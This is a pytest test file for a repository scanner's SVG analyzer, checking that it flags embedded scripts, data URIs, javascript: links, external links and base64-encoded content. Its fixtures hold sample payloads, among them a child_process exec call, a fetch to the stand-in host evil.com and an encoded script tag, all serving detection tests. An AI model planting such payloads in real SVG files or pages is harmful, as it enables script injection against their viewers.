"""Additional SVG analyzer tests — uncovered branches."""
import pytest
from reporeaver.analyzers.svg_analyzer import (
    SVGVectorAnalyzer, check_scripts, check_data_uris, check_js_uris,
    check_external_links, try_base64_decode, line_of,
)
from reporeaver.models import FileEntry, Finding


@pytest.fixture
def entry():
    return FileEntry(path="test.svg", size=500, hash_sha256="x",
                     is_text=True, is_svg=True)


def _findings():
    return []


class TestCheckScripts:
    def test_empty_script_body_skipped(self):
        content = "<svg><script></script></svg>"
        findings = []
        check_scripts(content, "test.svg", findings)
        assert len(findings) == 0

    def test_script_with_node_api(self):
        content = '<svg><script>require("child_process").exec("ls")</script></svg>'
        findings = []
        check_scripts(content, "test.svg", findings)
        assert len(findings) > 0

    def test_script_url_to_safe_domain(self):
        content = '<svg><script>fetch("https://cdn.jsdelivr.net/npm/pkg")</script></svg>'
        findings = []
        check_scripts(content, "test.svg", findings)
        net_findings = [f for f in findings
                        if "phones home" in f.title.lower()]
        assert len(net_findings) == 0

    def test_script_url_to_unknown_domain(self):
        content = '<svg><script>fetch("https://evil.com/hack")</script></svg>'
        findings = []
        check_scripts(content, "test.svg", findings)
        net_findings = [f for f in findings
                        if "phones home" in f.title.lower()]
        assert len(net_findings) > 0


class TestCheckDataUris:
    def test_base64_data_uri_with_script(self):
        content = '<svg><image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/></svg>'
        findings = []
        check_data_uris(content, "test.svg", findings)
        assert len(findings) > 0


class TestCheckJsUris:
    def test_javascript_uri_detected(self):
        content = '<a href="javascript:alert(1)">click</a>'
        findings = []
        check_js_uris(content, "test.svg", findings)
        assert len(findings) > 0


class TestCheckExternalLinks:
    def test_external_link_flagged(self):
        content = '<a xlink:href="https://external.com/link">click</a>'
        findings = []
        check_external_links(content, "test.svg", findings)
        assert len(findings) > 0


class TestTryBase64Decode:
    def test_atob_decode(self):
        text = 'atob("dGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZw==")'
        result = try_base64_decode(text)
        assert "this is a base64" in result

    def test_long_b64_decode(self):
        text = "dGhpcyBpcyBhIHZlcnkgbG9uZyBzdHJpbmcgdG8gYmUgZGVjb2RlZA=="
        result = try_base64_decode(text)
        assert "this is a very" in result

    def test_invalid_b64_returns_none(self):
        result = try_base64_decode("!!!not base64!!!")
        assert result is None

    def test_short_b64_in_atob(self):
        text = 'atob("YQ==")'
        result = try_base64_decode(text)
        assert result is None  # ATOB_B64 requires min 20 chars


class TestAnalyze:
    def test_should_analyze_svg(self, entry):
        assert SVGVectorAnalyzer().should_analyze(entry)

    def test_non_svg_returns_empty(self):
        e = FileEntry(path="test.txt", size=10, hash_sha256="x", is_text=True)
        res = SVGVectorAnalyzer().analyze(e, "hello")
        assert len(res.findings) == 0
